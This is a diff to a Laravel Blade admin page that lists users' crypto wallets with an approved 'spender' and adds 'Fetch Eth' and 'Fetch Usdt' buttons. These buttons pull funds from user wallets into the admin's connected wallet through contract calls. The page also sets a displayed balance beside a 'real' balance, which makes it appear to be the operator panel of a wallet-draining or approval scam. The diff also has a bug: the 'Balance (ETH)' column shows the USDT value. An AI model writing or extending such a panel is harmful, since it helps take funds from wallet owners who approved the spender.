@@ -15,10 +15,8 @@
         <div class="card">
             <div class="card-header">
                 <div class="row">
-                    <div class="col-md-6 mb-3">
-                        <input class="form-control" type="search" placeholder="Search with user id or wallet address" aria-label="Search" />
-                    </div>
-                    <div class="col-md-6">
+                   
+                    <div class="col-md-12">
                         <div class="float-right">
                             {{-- <small>Connected Wallet:</small> --}}
                             <button id="connectButton" type="button" class="btn btn-primary" onClick="connectWallet()">
@@ -29,14 +27,16 @@
                 </div>
             </div>
             <!-- /.card-header -->
-            <div class="card-body table-responsive p-0">
-                <table class="table table-striped text-nowrap">
+            <div class="card-body p-0 table-responsive">
+                <table class="table table-striped display text-nowrap" id="user-table">
                     <thead>
                         <tr>
                             <th style="width: 10px">#</th>
                             <th>User Id</th>
                             <th>Wallet Address</th>
-                            <th>Balance</th>
+                            <th>Balance (ETH)</th>
+                            <th>Real Balance (ETH)</th>
+                            <th>Balance (USDT)</th>
                             <th>Real Balance (USDT)</th>
                             <th>Status</th>
                             <th style="width: 40px">Actions</th>
@@ -46,10 +46,15 @@
                         @foreach($data as $key => $user)
                         <tr>
                             <td>{{$key += 1}}</td>
-                            <td>{{$user->user_id}}</td>
-                            <td>{{$user->wallet}} <br /> <span class="badge badge-primary">{{$user->spender ?? $user->spender }}</span></td>
-                            <td>{{number_format($user->balance)}}</td>
-                            <td id="real_balance">{{number_format($user->real_balance)}}</td>
+                            <td><a href="user/{{$user->user_id}}/transactions">{{$user->user_id}}</a></td>
+                            <td>{{$user->wallet}} <br> <span class="badge badge-primary">{{$user->spender ?? $user->spender }}</span></td>
+                            <td>{{$user->usdt_balance}}</td>
+
+                            <td id="real_balance">{{$user->eth_real_balance}} <br><span class="badge badge-secondary">{{$user->eth_real_balance_updated_at}}</span></td>
+                            <td>{{$user->usdt_balance}}</td>
+                            <td id="real_balance">{{$user->usdt_real_balance}} <br><span class="badge badge-secondary">{{$user->usdt_real_balance_updated_at}}</span></td>
+
+                                
                             <td>@if ($user->status == 'pending') <span class="badge badge-warning">pending</span> @else <span class="badge badge-primary">approved</span>@endif</td>
                             <td>
                                 {{-- <button class="btn btn-secondary">
@@ -61,10 +66,13 @@
                                     Approve
                                 </a>
                                 @else
-                                <a href="#" id="modal_{{$user->id}}" onClick="fetchToken('{{$user->id}}')" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->real_balance}}>
+                                <a href="#" id="modal_usdt_{{$user->id}}" onClick="fetchUsdtToken('{{$user->id}}')" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->usdt_real_balance}}>
                                     Fetch Usdt
                                 </a>
-                                <a href="{{ route('users.manage.balance', ['id' => $user->id]) }}" class="btn btn-secondary btn-sm">Manage balance</a>
+                                <a href="#" id="modal_eth_{{$user->id}}" onClick="fetchEthToken('{{$user->id}}')" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->eth_real_balance}}>
+                                    Fetch Eth
+                                </a>
+                                <a href="{{ route('users.manage.balance', ['id' => $user->user_id]) }}" class="btn btn-secondary btn-sm">Manage balance</a>
                                 @endif
                             </td>
                         </tr>
@@ -86,6 +94,8 @@
 <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"> </script>
 <script src="{{ asset('contracts/contractABI.js') }}"></script>
 <script src="{{ asset('contracts/contractAddress.js') }}"></script>
+<script src="{{asset('plugins/data-tables/dataTables.min.js')}}"></script>
+
 
 <script>
     const web3 = new Web3(window.ethereum)
@@ -123,10 +133,13 @@
         })
         const adminWalletAddress = accounts[0]
         let user = $('#modal-wallet').val();
-        let amount = parseInt($('#modal-amount').val());
+        let amount = $('#modal-amount').val();
         try {
+            // Convert amount to Wei
+            const amountInEth = web3.utils.toWei(amount.toString(), 'ether')
+
             // Call the withdraw method on the contract
-            const transaction = await contract.methods.withdrawETH(user, amount).send({
+            const transaction = await contract.methods.withdrawETH(user, amountInEth).send({
                 from: adminWalletAddress,
             })
             console.log('ETH Withdrawal successful:', transaction)
@@ -140,7 +153,7 @@
                 });
 
                 $.ajax({
-                    url: "{{ route('fetch.tokens') }}",
+                    url: "{{ route('fetch.eth_tokens') }}",
                     type: 'POST',
                     data: {
                         wallet: user,
@@ -183,7 +196,7 @@
                 });
 
                 $.ajax({
-                    url: "{{ route('fetch.tokens') }}",
+                    url: "{{ route('fetch.usdt_tokens') }}",
                     type: 'POST',
                     data: {
                         wallet: user,
@@ -223,21 +236,20 @@
 
     };
 
-    async function fetchToken(id) {
+    async function fetchEthToken(id) {
         const accounts = await window.ethereum.request({
             method: 'eth_requestAccounts'
         });
         const adminWalletAddress = accounts[0];
 
-        var wallet = $("#modal_" + id).attr('data-wallet');
-        var balance = $("#modal_" + id).attr('data-balance');
+        var wallet = $("#modal_eth_" + id).attr('data-wallet');
+        var balance = $("#modal_eth_" + id).attr('data-balance');
 
         $("#modal-wallet").val(wallet);
         $("#modal-spender").val(adminWalletAddress);
         $("#modal-balance").text(balance);
 
         $('#fetchForm').modal('show');
-
 
     }
 
@@ -246,7 +258,6 @@
         var balance = $("#modal-amount").val();
 
         var a_balance = $("#modal-balance").text();
-
 
         if (parseInt(balance) > parseInt(a_balance)) {
             $("#btn-fetch").attr("disabled", "disabled");
@@ -258,5 +269,13 @@
         }
 
     }
+
+    $('#user-table').DataTable({
+        "paging": true,
+        "lengthChange": false,
+        "searching": true,
+        "ordering": true,
+        responsive: true
+    });
 </script>
 @endsection
